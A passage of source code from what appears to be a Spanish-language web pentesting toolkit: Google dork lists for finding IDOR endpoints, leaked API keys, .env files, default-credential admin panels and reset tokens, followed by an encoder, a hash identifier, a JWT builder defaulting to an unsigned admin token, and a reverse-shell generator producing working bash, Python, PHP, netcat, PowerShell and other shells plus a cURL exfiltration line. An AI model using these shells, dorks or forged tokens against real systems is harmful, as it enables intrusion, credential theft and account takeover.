      `site:{domain} inurl:"/generatepdf" inurl:"?id="`,
      `site:{domain} inurl:"/generate_pdf" inurl:"?id="`,
    ],
    icon: <Eye className="h-4 w-4" />,
    description: "Endpoints de descarga y exportación con IDs directos — alto riesgo de IDOR",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "IDOR — REST API Paths",
    dorks: [
      `site:{domain} inurl:"/api/v1/users/"`,
      `site:{domain} inurl:"/api/v2/users/"`,
      `site:{domain} inurl:"/api/v1/accounts/"`,
      `site:{domain} inurl:"/api/v1/orders/"`,
      `site:{domain} inurl:"/api/v1/invoices/"`,
      `site:{domain} inurl:"/api/v1/profile/"`,
      `site:{domain} inurl:"/api/v1/documents/"`,
      `site:{domain} inurl:"/api/v1/messages/"`,
      `site:{domain} inurl:"/api/v1/payments/"`,
      `site:{domain} inurl:"/api/v1/tickets/"`,
      `site:{domain} inurl:"/api/v1/reports/"`,
      `site:{domain} inurl:"/api/me/" inurl:"?"`,
      `site:{domain} inurl:"/rest/user/" inurl:"?"`,
      `site:{domain} inurl:"/rest/account/" inurl:"?"`,
      `site:{domain} inurl:"/graphql" inurl:"?query="`,
    ],
    icon: <Eye className="h-4 w-4" />,
    description: "Rutas REST con recursos numerados — IDOR en APIs modernas",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "IDOR — UUID & Token Exposed",
    dorks: [
      `site:{domain} inurl:"/user/" inurl:"-"`,
      `site:{domain} inurl:"/account/" inurl:"-"`,
      `site:{domain} inurl:"/order/" inurl:"-"`,
      `site:{domain} inurl:"/invoice/" inurl:"-"`,
      `site:{domain} inurl:"?token=" inurl:& -inurl:"reset" -inurl:"verify"`,
      `site:{domain} inurl:"?access_token="`,
      `site:{domain} inurl:"?auth_token="`,
      `site:{domain} inurl:"?share_token="`,
      `site:{domain} inurl:"?view_token="`,
      `site:{domain} inurl:"?key=" inurl:& ext:php`,
      `site:{domain} inurl:"?hash=" inurl:& ext:php`,
      `site:{domain} inurl:"?ref=" inurl:& -inurl:"ref=google"`,
      `site:{domain} inurl:"/admin/user/" inurl:"?"`,
      `site:{domain} inurl:"/manage/account/" inurl:"?"`,
    ],
    icon: <Eye className="h-4 w-4" />,
    description: "UUIDs, tokens y hashes expuestos en URLs — IDOR con identificadores no numéricos",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "IDOR — Admin & Management",
    dorks: [
      `site:{domain} inurl:"/admin/users/" inurl:"?id="`,
      `site:{domain} inurl:"/admin/edit" inurl:"?id="`,
      `site:{domain} inurl:"/admin/delete" inurl:"?id="`,
      `site:{domain} inurl:"/admin/view" inurl:"?id="`,
      `site:{domain} inurl:"/manage/user" inurl:"?id="`,
      `site:{domain} inurl:"/dashboard/user" inurl:"?id="`,
      `site:{domain} inurl:"/panel/user" inurl:"?id="`,
      `site:{domain} inurl:"/cp/user" inurl:"?id="`,
      `site:{domain} inurl:"/control/account" inurl:"?id="`,
      `site:{domain} inurl:"/staff/user" inurl:"?id="`,
      `site:{domain} inurl:"/backoffice/user" inurl:"?id="`,
      `site:{domain} inurl:"/portal/account" inurl:"?id="`,
    ],
    icon: <Eye className="h-4 w-4" />,
    description: "Rutas de administración con IDs directos — IDOR horizontal y vertical",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "Open Redirect — Parameters",
    dorks: [
      `site:{domain} inurl:"?redirect="`,
      `site:{domain} inurl:"?redirect_to="`,
      `site:{domain} inurl:"?redirect_url="`,
      `site:{domain} inurl:"?return="`,
      `site:{domain} inurl:"?return_to="`,
      `site:{domain} inurl:"?returnUrl="`,
      `site:{domain} inurl:"?return_url="`,
      `site:{domain} inurl:"?next="`,
      `site:{domain} inurl:"?next_url="`,
      `site:{domain} inurl:"?continue="`,
      `site:{domain} inurl:"?goto="`,
      `site:{domain} inurl:"?dest="`,
      `site:{domain} inurl:"?destination="`,
      `site:{domain} inurl:"?url="`,
      `site:{domain} inurl:"?forward="`,
      `site:{domain} inurl:"?out="`,
    ],
    icon: <ExternalLink className="h-4 w-4" />,
    description: "Parámetros de redirección — candidatos a Open Redirect y SSRF",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "Web Vulns"
  },
  {
    title: "Exposed API Keys & Tokens",
    dorks: [
      `site:{domain} inurl:".json" intext:"api_key"`,
      `site:{domain} inurl:".js" intext:"apiKey"`,
      `site:{domain} inurl:".js" intext:"api_key"`,
      `site:{domain} inurl:".js" intext:"access_token"`,
      `site:{domain} inurl:".js" intext:"client_secret"`,
      `site:{domain} inurl:".js" intext:"AWS_ACCESS_KEY"`,
      `site:{domain} inurl:".js" intext:"stripe" intext:"sk_live"`,
      `site:{domain} inurl:".js" intext:"twilio" intext:"authToken"`,
      `site:{domain} inurl:".js" intext:"firebase" intext:"apiKey"`,
      `site:{domain} inurl:".js" intext:"google" intext:"AIza"`,
      `site:{domain} inurl:".env" intext:"SECRET"`,
      `site:{domain} filetype:json intext:"private_key"`,
      `site:{domain} filetype:yaml intext:"password:"`,
      `site:{domain} filetype:xml intext:"password"`,
    ],
    icon: <Lock className="h-4 w-4" />,
    description: "API keys, tokens y secrets expuestos en archivos JS, JSON, YAML y XML",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Credenciales"
  },
  {
    title: "Juicy Extensions",
    dorks: [
      `site:{domain} ext:php inurl:"?"`,
      `site:{domain} ext:asp inurl:"?"`,
      `site:{domain} ext:aspx inurl:"?"`,
      `site:{domain} ext:jsp inurl:"?"`,
      `site:{domain} ext:cfm inurl:"?"`,
      `site:{domain} ext:cgi inurl:"?"`,
      `site:{domain} ext:pl inurl:"?"`,
      `site:{domain} ext:env`,
      `site:{domain} ext:xml inurl:"?"`,
      `site:{domain} ext:json inurl:"?"`,
      `site:{domain} ext:yaml | ext:yml`,
      `site:{domain} ext:toml`,
      `site:{domain} ext:ini`,
      `site:{domain} ext:conf`,
      `site:{domain} ext:log`,
      `site:{domain} ext:sql`,
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Extensiones de archivo con mayor superficie de ataque indexadas en el dominio",
    color: "bg-amber-500/10 text-amber-600 border-amber-500/20",
    group: "Recon"
  },
  {
    title: "Wayback & Cache — Hidden Endpoints",
    dorks: [
      `cache:{domain}`,
      `site:web.archive.org "{domain}" inurl:"/api/"`,
      `site:web.archive.org "{domain}" inurl:"/admin/"`,
      `site:web.archive.org "{domain}" inurl:"?id="`,
      `site:web.archive.org "{domain}" ext:php`,
      `site:web.archive.org "{domain}" inurl:"login"`,
      `site:web.archive.org "{domain}" inurl:"backup"`,
      `site:web.archive.org "{domain}" inurl:".env"`,
      `site:web.archive.org "{domain}" inurl:"swagger"`,
      `site:web.archive.org "{domain}" inurl:"/.git"`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "Rutas y endpoints históricos indexados en Wayback Machine y caché de Google",
    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
    group: "Recon"
  },
  {
    title: "Subdomains & Virtual Hosts",
    dorks: [
      `site:*.{domain} -www`,
      `site:*.{domain} inurl:admin`,
      `site:*.{domain} inurl:dev | inurl:staging | inurl:test`,
      `site:*.{domain} inurl:api`,
      `site:*.{domain} inurl:internal`,
      `site:*.{domain} inurl:portal`,
      `site:*.{domain} inurl:dashboard`,
      `site:*.{domain} inurl:login`,
      `site:*.{domain} inurl:beta`,
      `site:*.{domain} inurl:old`,
      `site:*.{domain} inurl:legacy`,
      `site:*.{domain} inurl:vpn`,
      `site:*.{domain} inurl:mail`,
      `site:*.{domain} inurl:cdn`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "Subdominios expuestos — entornos dev, staging, admin, portales internos",
    color: "bg-green-500/10 text-green-600 border-green-500/20",
    group: "Recon"
  },
  {
    title: "GraphQL Endpoints",
    dorks: [
      `site:{domain} inurl:"/graphql"`,
      `site:{domain} inurl:"/graphiql"`,
      `site:{domain} inurl:"/v1/graphql"`,
      `site:{domain} inurl:"/v2/graphql"`,
      `site:{domain} inurl:"/api/graphql"`,
      `site:{domain} inurl:"/graphql/console"`,
      `site:{domain} inurl:"/graphql/playground"`,
      `site:{domain} inurl:"/graphql/explorer"`,
      `site:{domain} inurl:"/__graphql"`,
      `site:{domain} inurl:"/graphql" inurl:"?query="`,
      `site:{domain} inurl:"/graphql" inurl:"introspection"`,
      `site:{domain} intitle:"GraphQL Playground"`,
      `site:{domain} intitle:"GraphiQL"`,
      `site:{domain} intitle:"Apollo Sandbox"`,
    ],
    icon: <Code className="h-4 w-4" />,
    description: "Endpoints GraphQL expuestos con introspección habilitada — enumerar schema completo",
    color: "bg-sky-500/10 text-sky-600 border-sky-500/20",
    group: "Web Vulns"
  },
  {
    title: "CORS Misconfiguration",
    dorks: [
      `site:{domain} inurl:"/api/" inurl:"?"`,
      `site:{domain} inurl:"/api/v1/" inurl:"?"`,
      `site:{domain} inurl:"/api/v2/" inurl:"?"`,
      `site:{domain} inurl:"/api/user" inurl:"?"`,
      `site:{domain} inurl:"/api/account" inurl:"?"`,
      `site:{domain} inurl:"/api/data" inurl:"?"`,
      `site:{domain} inurl:"/api/profile" inurl:"?"`,
      `site:{domain} inurl:"/api/me"`,
      `site:{domain} inurl:"/api/settings"`,
      `site:{domain} inurl:"/api/token"`,
      `site:{domain} inurl:"/api/auth"`,
      `site:{domain} inurl:"/api/session"`,
    ],
    icon: <Globe className="h-4 w-4" />,
    description: "APIs que suelen tener CORS misconfiguration — probar con Origin: null y Origin: attacker.com",
    color: "bg-indigo-500/10 text-indigo-600 border-indigo-500/20",
    group: "Web Vulns"
  },
  {
    title: "Mobile API & Backend Endpoints",
    dorks: [
      `site:{domain} inurl:"/api/mobile/"`,
      `site:{domain} inurl:"/mobile/api/"`,
      `site:{domain} inurl:"/app/api/"`,
      `site:{domain} inurl:"/v1/mobile/"`,
      `site:{domain} inurl:"/api/app/"`,
      `site:{domain} inurl:"/api/android/"`,
      `site:{domain} inurl:"/api/ios/"`,
      `site:{domain} inurl:"/api/client/"`,
      `site:{domain} inurl:"/api/device/"`,
      `site:{domain} inurl:"/mobileapi/"`,
      `site:{domain} inurl:"/json/api/"`,
      `site:{domain} inurl:"/api/" ext:json`,
      `site:{domain} inurl:"/api/" inurl:"token="`,
      `site:{domain} inurl:"/fcm" | inurl:"/push-notification"`,
    ],
    icon: <Target className="h-4 w-4" />,
    description: "Backends de aplicaciones móviles — APIs sin misma protección que el frontend web",
    color: "bg-purple-500/10 text-purple-600 border-purple-500/20",
    group: "Recon"
  },
  {
    title: "WebSocket Endpoints",
    dorks: [
      `site:{domain} inurl:"/ws"`,
      `site:{domain} inurl:"/websocket"`,
      `site:{domain} inurl:"/ws/"`,
      `site:{domain} inurl:"/socket.io/"`,
      `site:{domain} inurl:"/sockjs/"`,
      `site:{domain} inurl:"/ws/chat"`,
      `site:{domain} inurl:"/ws/notify"`,
      `site:{domain} inurl:"/ws/feed"`,
      `site:{domain} inurl:"/realtime/"`,
      `site:{domain} inurl:"/live/"`,
      `site:{domain} inurl:"/stream/"`,
      `site:{domain} intext:"socket.io" filetype:js`,
      `site:{domain} intext:"new WebSocket(" filetype:js`,
      `site:{domain} intext:"wss://" filetype:js`,
    ],
    icon: <Zap className="h-4 w-4" />,
    description: "Endpoints WebSocket — candidatos a CSWSH, inyección de mensajes y auth bypass",
    color: "bg-cyan-500/10 text-cyan-600 border-cyan-500/20",
    group: "Web Vulns"
  },
  {
    title: "OAuth & SSO Endpoints",
    dorks: [
      `site:{domain} inurl:"/oauth/authorize"`,
      `site:{domain} inurl:"/oauth/token"`,
      `site:{domain} inurl:"/oauth/callback"`,
      `site:{domain} inurl:"/auth/callback"`,
      `site:{domain} inurl:"/auth/oauth"`,
      `site:{domain} inurl:"/sso/login"`,
      `site:{domain} inurl:"/sso/callback"`,
      `site:{domain} inurl:"/.well-known/openid-configuration"`,
      `site:{domain} inurl:"/.well-known/jwks.json"`,
      `site:{domain} inurl:"/connect/authorize"`,
      `site:{domain} inurl:"/connect/token"`,
      `site:{domain} inurl:"/openid-connect"`,
      `site:{domain} inurl:"/saml/acs"`,
      `site:{domain} inurl:"/saml/sso"`,
    ],
    icon: <Lock className="h-4 w-4" />,
    description: "Endpoints OAuth2, OIDC y SAML — redirect_uri bypass, CSRF en state, token leakage",
    color: "bg-violet-500/10 text-violet-600 border-violet-500/20",
    group: "Web Vulns"
  },
  {
    title: "Spring Boot Actuator",
    dorks: [
      `site:{domain} inurl:"/actuator"`,
      `site:{domain} inurl:"/actuator/env"`,
      `site:{domain} inurl:"/actuator/heapdump"`,
      `site:{domain} inurl:"/actuator/mappings"`,
      `site:{domain} inurl:"/actuator/beans"`,
      `site:{domain} inurl:"/actuator/configprops"`,
      `site:{domain} inurl:"/actuator/httptrace"`,
      `site:{domain} inurl:"/actuator/logfile"`,
      `site:{domain} inurl:"/actuator/threaddump"`,
      `site:{domain} inurl:"/actuator/health"`,
      `site:{domain} inurl:"/actuator/info"`,
      `site:{domain} inurl:"/actuator/metrics"`,
      `site:{domain} inurl:"/actuator/sessions"`,
      `site:{domain} inurl:"/actuator/shutdown"`,
      `site:{domain} inurl:"/manage/env" | inurl:"/manage/health"`,
    ],
    icon: <Zap className="h-4 w-4" />,
    description: "Spring Boot Actuator expuesto — env con secrets, heapdump con passwords, mappings internos",
    color: "bg-green-500/10 text-green-600 border-green-500/20",
    group: "Infraestructura"
  },
  {
    title: "Directory Listing",
    dorks: [
      `intitle:"index of" site:{domain}`,
      `intitle:"index of /" site:{domain}`,
      `intitle:"index of" "parent directory" site:{domain}`,
      `intitle:"index of" ".env" site:{domain}`,
      `intitle:"index of" ".git" site:{domain}`,
      `intitle:"index of" "backup" site:{domain}`,
      `intitle:"index of" "config" site:{domain}`,
      `intitle:"index of" "uploads" site:{domain}`,
      `intitle:"index of" "logs" site:{domain}`,
      `intitle:"index of" "tmp" | "temp" site:{domain}`,
      `intitle:"index of" ".sql" site:{domain}`,
      `intitle:"index of" ".zip" | ".tar.gz" | ".rar" site:{domain}`,
      `intitle:"index of" "private" site:{domain}`,
      `intitle:"index of" "api" site:{domain}`,
      `intitle:"index of" "wp-content" site:{domain}`,
    ],
    icon: <FileText className="h-4 w-4" />,
    description: "Directory listing habilitado — acceso directo a backups, configs, logs y archivos sensibles",
    color: "bg-amber-500/10 text-amber-600 border-amber-500/20",
    group: "Archivos"
  },
  {
    title: "Default Credentials Panels",
    dorks: [
      `intitle:"Apache Tomcat" intext:"admin" intext:"password" site:{domain}`,
      `intitle:"Tomcat" inurl:"/manager/html" site:{domain}`,
      `intitle:"RouterOS" intext:"admin" site:{domain}`,
      `intitle:"MikroTik" inurl:"/winbox" site:{domain}`,
      `intitle:"Cisco" inurl:"/level/15/exec" site:{domain}`,
      `intitle:"D-Link" inurl:"/login.asp" site:{domain}`,
      `intitle:"TP-Link" inurl:"/login.htm" site:{domain}`,
      `intitle:"NETGEAR" inurl:"/setup.cgi" site:{domain}`,
      `intitle:"ZyXEL" inurl:"/login.html" site:{domain}`,
      `intitle:"phpMyAdmin" intext:"Welcome to phpMyAdmin" site:{domain}`,
      `intitle:"Webmin" inurl:":10000" site:{domain}`,
      `intitle:"cPanel" inurl:":2083" site:{domain}`,
      `intitle:"WHM" inurl:":2087" site:{domain}`,
      `intitle:"Plesk" inurl:":8443" site:{domain}`,
      `intitle:"DirectAdmin" inurl:":2222" site:{domain}`,
    ],
    icon: <Lock className="h-4 w-4" />,
    description: "Paneles con credenciales por defecto conocidas — Tomcat admin:admin, RouterOS, cPanel, Webmin",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Infraestructura"
  },
  {
    title: "Exposed Metrics & Health",
    dorks: [
      `site:{domain} inurl:"/metrics"`,
      `site:{domain} inurl:"/health"`,
      `site:{domain} inurl:"/health/live"`,
      `site:{domain} inurl:"/health/ready"`,
      `site:{domain} inurl:"/healthz"`,
      `site:{domain} inurl:"/readyz"`,
      `site:{domain} inurl:"/livez"`,
      `site:{domain} inurl:"/status"`,
      `site:{domain} inurl:"/server-status"`,
      `site:{domain} inurl:"/server-info"`,
      `site:{domain} inurl:"/info"`,
      `site:{domain} inurl:"/debug"`,
      `site:{domain} inurl:"/debug/vars"`,
      `site:{domain} inurl:"/debug/pprof"`,
      `site:{domain} inurl:"prometheus" inurl:"/metrics"`,
    ],
    icon: <Target className="h-4 w-4" />,
    description: "Endpoints de métricas y salud expuestos — Prometheus /metrics, /debug, /server-status con info interna",
    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
    group: "Infraestructura"
  },
  {
    title: "Password Reset & Account Takeover",
    dorks: [
      `site:{domain} inurl:"/reset" inurl:"?token="`,
      `site:{domain} inurl:"/reset-password" inurl:"?token="`,
      `site:{domain} inurl:"/forgot" inurl:"?token="`,
      `site:{domain} inurl:"/verify" inurl:"?token="`,
      `site:{domain} inurl:"/confirm" inurl:"?token="`,
      `site:{domain} inurl:"/activate" inurl:"?token="`,
      `site:{domain} inurl:"/unsubscribe" inurl:"?token="`,
      `site:{domain} inurl:"/change-email" inurl:"?token="`,
      `site:{domain} inurl:"/change_password" inurl:"?key="`,
      `site:{domain} inurl:"/oauth/authorize" inurl:"?"`,
      `site:{domain} inurl:"/oauth/callback" inurl:"?"`,
      `site:{domain} inurl:"/auth/callback" inurl:"?"`,
      `site:{domain} inurl:"/sso" inurl:"?"`,
    ],
    icon: <Lock className="h-4 w-4" />,
    description: "Endpoints de reset de contraseña, verificación y OAuth — account takeover",
    color: "bg-red-500/10 text-red-600 border-red-500/20",
    group: "Web Vulns"
  },
]

export function GoogleDorksGenerator() {
  const [domain, setDomain] = useState("")
  const [copiedIndex, setCopiedIndex] = useState<string | null>(null)
  const [activeTab, setActiveTab] = useState<"dorks" | "payloads" | "tools">("dorks")
  const [dorkFilter, setDorkFilter] = useState("all")
  const [dorkSearch, setDorkSearch] = useState("")
  const [payloadFilter, setPayloadFilter] = useState("all")
  const [payloadSearch, setPayloadSearch] = useState("")
  // Encoder/Decoder state
  const [encInput, setEncInput] = useState("")
  const [encOutput, setEncOutput] = useState("")
  const [encCopied, setEncCopied] = useState(false)
  // Reverse shell state
  const [rsIP, setRsIP] = useState("")
  const [rsPort, setRsPort] = useState("4444")
  const [rsType, setRsType] = useState("bash-tcp")
  const [rsCopied, setRsCopied] = useState(false)
  // Hash Identifier state
  const [hashInput, setHashInput] = useState("")
  const [hashResults, setHashResults] = useState<string[]>([])
  // JWT Builder state
  const [jwtAlg, setJwtAlg] = useState("none")
  const [jwtHeader, setJwtHeader] = useState('{"alg":"none","typ":"JWT"}')
  const [jwtPayload, setJwtPayload] = useState('{"sub":"admin","role":"admin","exp":9999999999}')
  const [jwtSecret, setJwtSecret] = useState("")
  const [jwtOutput, setJwtOutput] = useState("")
  const [jwtCopied, setJwtCopied] = useState(false)
  // Subdomain Wordlist state
  const [subDomain, setSubDomain] = useState("")
  const [subList, setSubList] = useState<string[]>([])
  const [subCopied, setSubCopied] = useState(false)
  // XSS Exploit Toolkit state
  const [xssSection, setXssSection] = useState("defacement")

  const dorkGroups = ["all", "Recon", "Web Vulns", "Credenciales", "Archivos", "Infraestructura", "Cloud", "CMS", "OSINT"]

  const replaceDomain = (dork: string, inputDomain: string) => {
    // When no domain: strip optional " site:{domain}" so wordlist dorks work as global search
    if (!inputDomain) {
      return dork.replace(/\s*site:\s*\{domain\}/g, "").trim()
    }

    // Split domains by comma and clean up spaces
    const domains = inputDomain.split(',').map(d => d.trim()).filter(d => d.length > 0)
    
    if (domains.length === 1) {
      // Single domain - replace normally
      return dork.replace(/{domain}/g, domains[0])
    } else {
      // Multiple domains - create domain1 | domain2 format (without site: prefix)
      const domainList = domains.join(' | ')
      
      // Check if the dork already has site: prefix
      if (dork.includes('site:{domain}')) {
        // Replace site:{domain} with site:domain1 | site:domain2
        const siteQueries = domains.map(domain => `site:${domain}`).join(' | ')
        return dork.replace(/site:\{domain\}/g, siteQueries)
      } else {
        // Replace {domain} with just the domain list
        return dork.replace(/{domain}/g, domainList)
      }
    }
  }

  const copyToClipboard = async (text: string, index: string) => {
    await navigator.clipboard.writeText(text)
    setCopiedIndex(index)
    setTimeout(() => setCopiedIndex(null), 2000)
  }

  const generateGoogleSearchUrl = (query: string) => {
    return `https://www.google.com/search?q=${encodeURIComponent(query)}`
  }

  const openAllQueries = (dorks: string[]) => {
    // Open each dork individually in separate tabs
    dorks.forEach((dork) => {
      const processedDork = replaceDomain(dork, domain)
      const url = generateGoogleSearchUrl(processedDork)
      window.open(url, "_blank")
    })
  }

  const openAllDorks = () => {
    dorkCategories.forEach((category) => {
      category.dorks.forEach((dork) => {
        const processedDork = replaceDomain(dork, domain)
        const url = generateGoogleSearchUrl(processedDork)
        window.open(url, "_blank")
      })
    })
  }

  // ── Encoder / Decoder ──────────────────────────────────────────────────────
  const runEncode = (type: string) => {
    try {
      let result = ""
      switch (type) {
        case "url-enc":    result = encodeURIComponent(encInput); break
        case "url-dec":    result = decodeURIComponent(encInput); break
        case "url-double": result = encodeURIComponent(encodeURIComponent(encInput)); break
        case "b64-enc":    result = btoa(unescape(encodeURIComponent(encInput))); break
        case "b64-dec":    result = decodeURIComponent(escape(atob(encInput))); break
        case "html-enc":
          result = encInput.replace(/[&<>"'`]/g, (c) =>
            ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" }[c] ?? c))
          break
        case "html-dec":
          result = encInput.replace(/&(amp|lt|gt|quot|#x27|#x60|#(\d+));/g, (_, e, num) =>
            num ? String.fromCharCode(Number(num)) :
            ({ amp: "&", lt: "<", gt: ">", quot: '"', "#x27": "'", "#x60": "`" }[e] ?? _))
          break
        case "hex-enc":
          result = Array.from(encInput).map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("")
          break
        case "hex-dec":
          result = (encInput.match(/.{1,2}/g) ?? []).map(h => String.fromCharCode(parseInt(h, 16))).join("")
          break
        case "unicode":
          result = Array.from(encInput).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("")
          break
        case "js-escape":
          result = Array.from(encInput).map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2,"0")}`).join("")
          break
        default: result = encInput
      }
      setEncOutput(result)
    } catch {
      setEncOutput("⚠ Error: input inválido para esta operación")
    }
  }

  const copyEncOutput = async () => {
    await navigator.clipboard.writeText(encOutput)
    setEncCopied(true)
    setTimeout(() => setEncCopied(false), 2000)
  }

  // ── Reverse Shell Generator ────────────────────────────────────────────────
  const reverseShells: Record<string, { label: string; cmd: (ip: string, port: string) => string }> = {
    "bash-tcp":    { label: "Bash TCP",         cmd: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
    "bash-udp":    { label: "Bash UDP",         cmd: (ip, p) => `bash -i >& /dev/udp/${ip}/${p} 0>&1` },
    "sh-tcp":      { label: "sh TCP",           cmd: (ip, p) => `sh -i >& /dev/tcp/${ip}/${p} 0>&1` },
    "python3":     { label: "Python 3",         cmd: (ip, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    "python2":     { label: "Python 2",         cmd: (ip, p) => `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    "php":         { label: "PHP",              cmd: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'` },
    "php-proc":    { label: "PHP proc_open",    cmd: (ip, p) => `php -r '$s=fsockopen("${ip}",${p});$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` },
    "perl":        { label: "Perl",             cmd: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
    "ruby":        { label: "Ruby",             cmd: (ip, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
    "nc-e":        { label: "Netcat -e",        cmd: (ip, p) => `nc -e /bin/sh ${ip} ${p}` },
    "nc-mkfifo":   { label: "Netcat mkfifo",    cmd: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
    "nc-openbsd":  { label: "Netcat (OpenBSD)", cmd: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -q1 ${ip} ${p} >/tmp/f` },
    "socat":       { label: "Socat",            cmd: (ip, p) => `socat TCP:${ip}:${p} EXEC:/bin/sh` },
    "socat-pty":   { label: "Socat PTY",        cmd: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` },
    "node":        { label: "Node.js",          cmd: (ip, p) => `node -e "var n=require('net'),s=new n.Socket();s.connect(${p},'${ip}',function(){require('child_process').exec('/bin/sh',function(e,so,se){s.write(so+se)});});"` },
    "java":        { label: "Java",             cmd: (ip, p) => `java -cp . Reverse ${ip} ${p}` },
    "powershell":  { label: "PowerShell",       cmd: (ip, p) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
    "ps-base64":   { label: "PowerShell B64",   cmd: (ip, p) => `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIke2lwfQAiACwAJHtwfQApADsA` },
    "golang":      { label: "Go",               cmd: (ip, p) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
    "awk":         { label: "AWK",              cmd: (ip, p) => `awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";while(1){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}'` },
    "lua":         { label: "Lua",              cmd: (ip, p) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
    "curl-upload": { label: "cURL exfil",       cmd: (ip, p) => `curl -s http://${ip}:${p}/$(whoami|base64)` },
  }

  const currentShell = reverseShells[rsType]?.cmd(rsIP || "LHOST", rsPort || "LPORT") ?? ""

  // ── Hash Identifier ────────────────────────────────────────────────────────
  const identifyHash = (h: string): string[] => {
    const s = h.trim()
    const results: string[] = []
    if (!s) return results
    if (/^\$2[ab]\$\d{2}\$.{53}$/.test(s))         results.push("bcrypt")
    if (/^\$6\$/.test(s))                            results.push("SHA-512crypt ($6$)")
    if (/^\$5\$/.test(s))                            results.push("SHA-256crypt ($5$)")
    if (/^\$1\$/.test(s))                            results.push("MD5crypt ($1$)")
    if (/^\$argon2/.test(s))                         results.push("Argon2")
    if (/^\$P\$/.test(s))                            results.push("WordPress (phpass)")
    if (/^\$S\$/.test(s))                            results.push("Drupal7 (SHA-512)")
    if (/^pbkdf2_sha/.test(s))                       results.push("Django PBKDF2")
    if (/^\*[A-Fa-f0-9]{40}$/.test(s))              results.push("MySQL 4.1+ / SHA1(SHA1(pass))")
    if (/^[A-Fa-f0-9]{128}$/.test(s))               results.push("SHA-512 (128 hex)")
    if (/^[A-Fa-f0-9]{96}$/.test(s))                results.push("SHA-384 (96 hex)")
    if (/^[A-Fa-f0-9]{64}$/.test(s))                results.push("SHA-256 (64 hex)")
    if (/^[A-Fa-f0-9]{56}$/.test(s))                results.push("SHA-224 (56 hex)")
    if (/^[A-Fa-f0-9]{40}$/.test(s))                results.push("SHA-1 (40 hex)")
    if (/^[A-Fa-f0-9]{32}$/.test(s))                results.push("MD5 / NTLM / MD4 (32 hex)")
    if (/^[A-Fa-f0-9]{16}$/.test(s))                results.push("MySQL 3.x / DES (16 hex)")
    if (/^[A-Za-z0-9+/]{43}=$/.test(s))             results.push("SHA-256 Base64")
    if (/^[A-Za-z0-9+/]{88}={0,2}$/.test(s))        results.push("SHA-512 Base64")
    if (/^[A-Za-z0-9+/]{27}=$/.test(s))             results.push("MD5 Base64")
    if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(s)) results.push("JWT (JSON Web Token)")
    if (/^[A-Za-z0-9+/]+=*$/.test(s) && s.length % 4 === 0 && results.length === 0)
      results.push("Base64 genérico")
    if (results.length === 0) results.push("Tipo desconocido — posible hash personalizado o encoded")
    return results
  }

